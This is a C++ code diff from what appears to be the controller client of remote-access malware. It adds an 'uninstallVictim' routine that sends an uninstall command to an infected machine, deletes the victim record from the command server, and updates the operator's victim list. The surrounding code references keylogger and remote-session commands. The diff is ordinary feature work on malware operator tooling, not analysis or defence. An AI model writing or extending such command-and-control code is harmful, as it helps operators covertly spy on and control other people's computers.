@@ -241,6 +241,32 @@ bool Client::sendUninstallCommand(const UUID& client_id) {
     return post_victim_command(client_id, "uninstall", "Sending Uninstall Command Failed");
 }
 
+bool Client::uninstallVictim(const Victim& victim) {
+    if (victim.uid.empty() || victim.id <= 0) {
+        return false;
+    }
+
+    if (!sendUninstallCommand(victim.uid)) {
+        return false;
+    }
+
+    m_gateway.set_credentials(getUsername(), getPassword());
+    const auto delete_result = m_gateway.delete_victim(victim.id);
+    if (!delete_result) {
+        m_log_man.local_log(std::format(
+            "Uninstall command sent, but removing victim from server failed: {}",
+            delete_result.error().message));
+    }
+
+    if (!m_vic_man.removeVictim(victim.uid)) {
+        return false;
+    }
+
+    m_victim_count.store(m_vic_man.getVictims().size());
+    updateStatusText();
+    return true;
+}
+
 bool Client::openSession(int64_t port) {
     m_gateway.set_credentials(getUsername(), getPassword());
     const auto result = m_gateway.open_session(port);
@@ -293,5 +319,5 @@ bool Client::sendStopKeyloggerCommand(int64_t client_id) {
 }
 
 bool Client::sendUninstallCommand(int64_t client_id) {
-    return sendUninstallCommand(m_vic_man.getVictim(client_id).uid);
+    return uninstallVictim(m_vic_man.getVictim(client_id));
 }
